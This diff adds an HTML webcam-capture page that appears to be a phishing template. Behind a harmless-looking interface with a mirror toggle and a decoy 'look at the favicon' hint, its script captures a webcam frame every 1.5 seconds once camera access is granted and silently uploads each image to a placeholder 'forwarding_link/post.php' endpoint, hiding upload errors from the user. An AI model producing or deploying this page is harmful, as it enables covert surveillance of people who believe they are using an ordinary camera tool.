@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enhanced Webcam Capture</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <style>
+        :root {
+            --primary-color: #4285f4;
+            --secondary-color: #34a853;
+            --error-color: #ea4335;
+            --background-color: #f8f9fa;
+            --card-color: #ffffff;
+            --text-color: #202124;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--background-color);
+            color: var(--text-color);
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 30px auto;
+            padding: 20px;
+            background-color: var(--card-color);
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            text-align: center;
+            margin-bottom: 20px;
+            color: var(--primary-color);
+        }
+
+        .video-container {
+            position: relative;
+            overflow: hidden;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            background-color: #000;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        #video, #canvas {
+            width: 100%;
+            height: auto;
+            border-radius: 6px;
+            transform-origin: center;
+        }
+
+        #canvas {
+            display: none;
+        }
+
+        .controls {
+            padding: 15px;
+            background-color: #f5f5f5;
+            border-radius: 8px;
+        }
+
+        .hint {
+            font-weight: bold;
+            color: var(--secondary-color);
+            margin-bottom: 10px;
+        }
+
+        .permission-note {
+            font-style: italic;
+            margin-bottom: 15px;
+            color: #666;
+        }
+
+        .control-options {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+
+        /* Toggle switch styling */
+        .switch {
+            position: relative;
+            display: inline-flex;
+            align-items: center;
+            cursor: pointer;
+        }
+
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .slider {
+            position: relative;
+            display: inline-block;
+            width: 50px;
+            height: 24px;
+            background-color: #ccc;
+            border-radius: 34px;
+            transition: .4s;
+            margin-right: 10px;
+        }
+
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 18px;
+            width: 18px;
+            left: 3px;
+            bottom: 3px;
+            background-color: white;
+            border-radius: 50%;
+            transition: .4s;
+        }
+
+        input:checked + .slider {
+            background-color: var(--primary-color);
+        }
+
+        input:checked + .slider:before {
+            transform: translateX(26px);
+        }
+
+        .label-text {
+            font-weight: 500;
+        }
+
+        .btn {
+            padding: 8px 16px;
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: 500;
+            transition: background-color 0.3s;
+        }
+
+        .btn:hover {
+            background-color: #3367d6;
+        }
+
+        .btn.active {
+            background-color: var(--secondary-color);
+        }
+
+        .status {
+            margin-top: 15px;
+            padding-top: 10px;
+            border-top: 1px solid #ddd;
+        }
+
+        #statusMsg {
+            font-weight: bold;
+            color: var(--primary-color);
+        }
+
+        #errorMsg {
+            color: var(--error-color);
+            margin-top: 5px;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                margin: 10px;
+                padding: 15px;
+            }
+            
+            .control-options {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Webcam Capture</h1>
+        
+        <div class="video-container">
+            <div class="video-wrap">
+                <video id="video" playsinline autoplay></video>
+            </div>
+            <canvas id="canvas" width="640" height="480"></canvas>
+        </div>
+        
+        <div class="controls">
+            <p class="hint">Hint: Look at the favicon</p>
+            <p class="permission-note">Please accept camera permissions</p>
+            
+            <div class="control-options">
+                <label class="switch">
+                    <input type="checkbox" id="mirror">
+                    <span class="slider round"></span>
+                    <span class="label-text">Mirror image</span>
+                </label>
+                
+                <button id="captureBtn" class="btn">Capture Now</button>
+                <button id="toggleCaptureBtn" class="btn active">Pause Auto-Capture</button>
+            </div>
+            
+            <div class="status">
+                <p>Status: <span id="statusMsg">Running</span></p>
+                <p id="errorMsg"></p>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        'use strict';
+
+        // DOM elements
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const mirrorCheckbox = document.getElementById('mirror');
+        const captureBtn = document.getElementById('captureBtn');
+        const toggleCaptureBtn = document.getElementById('toggleCaptureBtn');
+        const statusMsg = document.getElementById('statusMsg');
+        const errorMsg = document.getElementById('errorMsg');
+
+        // Configuration
+        const constraints = {
+            audio: false,
+            video: {
+                facingMode: "user",
+                width: { ideal: 640 },
+                height: { ideal: 480 }
+            }
+        };
+
+        // State management
+        let stream = null;
+        let isCapturing = true;
+        let captureInterval = null;
+        let isMirrored = false;
+
+        // Initialize the application
+        async function init() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia(constraints);
+                handleSuccess(stream);
+                setupEventListeners();
+                startCapturing();
+            } catch (e) {
+                handleError(e);
+            }
+        }
+
+        // Handle successful stream acquisition
+        function handleSuccess(stream) {
+            window.stream = stream;
+            video.srcObject = stream;
+            
+            // Apply initial mirror setting
+            updateMirrorSetting();
+        }
+
+        // Set up event listeners for controls
+        function setupEventListeners() {
+            mirrorCheckbox.addEventListener('change', updateMirrorSetting);
+            
+            captureBtn.addEventListener('click', () => {
+                captureImage();
+                flashCaptureEffect();
+            });
+            
+            toggleCaptureBtn.addEventListener('click', toggleCapturing);
+        }
+
+        // Update video mirroring based on checkbox
+        function updateMirrorSetting() {
+            isMirrored = mirrorCheckbox.checked;
+            video.style.transform = isMirrored ? 'scaleX(-1)' : 'scaleX(1)';
+        }
+
+        // Start continuous capturing
+        function startCapturing() {
+            isCapturing = true;
+            statusMsg.textContent = 'Running';
+            toggleCaptureBtn.textContent = 'Pause Auto-Capture';
+            toggleCaptureBtn.classList.add('active');
+            
+            captureInterval = setInterval(() => {
+                captureImage();
+            }, 1500);
+        }
+
+        // Stop continuous capturing
+        function stopCapturing() {
+            isCapturing = false;
+            statusMsg.textContent = 'Paused';
+            toggleCaptureBtn.textContent = 'Resume Auto-Capture';
+            toggleCaptureBtn.classList.remove('active');
+            
+            clearInterval(captureInterval);
+        }
+
+        // Toggle capture state
+        function toggleCapturing() {
+            if (isCapturing) {
+                stopCapturing();
+            } else {
+                startCapturing();
+            }
+        }
+
+        // Capture image from video stream
+        function captureImage() {
+            const context = canvas.getContext('2d');
+            
+            if (isMirrored) {
+                context.save();
+                context.scale(-1, 1);
+                context.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
+                context.restore();
+            } else {
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            }
+            
+            const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+            post(canvasData);
+        }
+
+        // Visual feedback for capture
+        function flashCaptureEffect() {
+            const flashElement = document.createElement('div');
+            flashElement.className = 'flash-effect';
+            flashElement.style.position = 'absolute';
+            flashElement.style.top = '0';
+            flashElement.style.left = '0';
+            flashElement.style.right = '0';
+            flashElement.style.bottom = '0';
+            flashElement.style.backgroundColor = 'white';
+            flashElement.style.opacity = '0.5';
+            flashElement.style.zIndex = '10';
+            flashElement.style.borderRadius = '8px';
+            
+            document.querySelector('.video-container').appendChild(flashElement);
+            
+            setTimeout(() => {
+                flashElement.remove();
+            }, 150);
+        }
+
+        // Send captured image to server
+        function post(imgdata) {
+            $.ajax({
+                type: 'POST',
+                data: { cat: imgdata },
+                url: 'forwarding_link/post.php',
+                dataType: 'json',
+                async: true,
+                success: function(result) {
+                    // Handle success
+                },
+                error: function(xhr, status, error) {
+                    // Silently handle errors to not disrupt user experience
+                    console.log('Upload error:', error);
+                }
+            });
+        }
+
+        // Handle errors
+        function handleError(error) {
+            console.error('Error:', error);
+            errorMsg.textContent = `Camera error: ${error.message || error}`;
+            statusMsg.textContent = 'Error';
+            statusMsg.style.color = 'var(--error-color)';
+        }
+
+        // Clean up resources when page is unloaded
+        function cleanup() {
+            if (stream) {
+                stream.getTracks().forEach(track => {
+                    track.stop();
+                });
+            }
+            
+            if (captureInterval) {
+                clearInterval(captureInterval);
+            }
+        }
+
+        // Add event listener for page unload
+        window.addEventListener('beforeunload', cleanup);
+
+        // Start the application
+        init();
+    </script>
+</body>
+</html>
